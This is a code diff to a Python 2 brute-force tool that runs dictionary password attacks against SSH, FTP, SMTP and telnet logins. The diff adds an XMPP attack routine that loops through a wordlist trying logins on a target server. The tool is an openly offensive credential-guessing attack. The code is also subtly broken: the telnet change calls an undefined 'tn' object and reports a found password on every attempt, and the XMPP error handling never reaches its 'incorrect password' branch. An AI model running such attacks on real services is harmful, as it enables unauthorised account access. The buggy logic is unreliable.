@@ -11,6 +11,7 @@ Description:
     - telnet    Port: 23
     - ftp       Port: 21
     - smtp      Port: 25
+    - xmpp      Port: 5222
 
 Dependencies: main > smtplib, paramiko, ftplib
 
@@ -48,11 +49,14 @@ class ProtocolBruteforce:
                 self.port = 25
             elif self.service == "telnet":
                 self.port = 23
+            else:
+                self.port = 5222
             print O + "[?] Port not set. Automatically set to %s for you [?]" % self.port
+        
         print C + "[*] Port: %s "  % self.port + W
         sleep(1)
         print P + "[*] Starting dictionary attack! [*]" + W
-        print "Using %s seconds of delay. Default is 1 second" % self.delay
+        print "Using %s seconds of delay. Default is 1 second." % self.delay
         
         # Call respective methods
         if self.service == "ssh":
@@ -64,7 +68,8 @@ class ProtocolBruteforce:
             self.smtpBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
         elif self.service == "telnet":
             self.telnetBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
-
+        elif self.service == "xmpp":
+            self.xmppBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
         
     ## SSH - Secure SHell, connect AND bruteforce
 
@@ -149,9 +154,29 @@ class ProtocolBruteforce:
             except Exception as e:
                 print R + ("Error caught! %s" % e) + W 
             except KeyboardInterrupt:
-                s.close()
                 exit(1)
-            
+    
+    ## XMPP bruteforce    
+    
+    def xmppBruteforce(self, address, username, wordlist, port, delay):
+        wordlist = open(wordlist, 'r')
+        for i in wordlist.readlines():
+            password = i.strip("\n")
+            try:
+                client = Client(str(address))
+                client.connect(server=(str(address), port))
+                if client.auth(username, password):
+                    client.sendInitPresence()
+                    print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                    client.disconnect()
+                    exit(0)
+            except Exception as e:
+                print R + ("Error caught! Name: %s" % e) + W  
+            except KeyboardInterrupt:
+                exit(1)
+            except:
+                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+                sleep(delay)    
 
     def telnetBruteforce(self, address, username, wordlist, port, delay):
         telnet = telnetlib.Telnet(address)
@@ -163,10 +188,16 @@ class ProtocolBruteforce:
                 telnet.write(username + "\n")
                 telnet.read_until("Password: ")
                 telnet.write(password + "\n")
+                tn.write("vt100\n") 
+                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             except socket.error:
                 print R + "[!] Error: Connection Failed. [!]" + W
-            # TODO: write output and handle error
             except KeyboardInterrupt:
                 telnet.close()
                 exit(1)
-                
+            except EOFError:
+                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+                sleep(delay)
+            except Exception as e:
+                print R + ("Error caught! Name: %s" % e) + W  
+ 
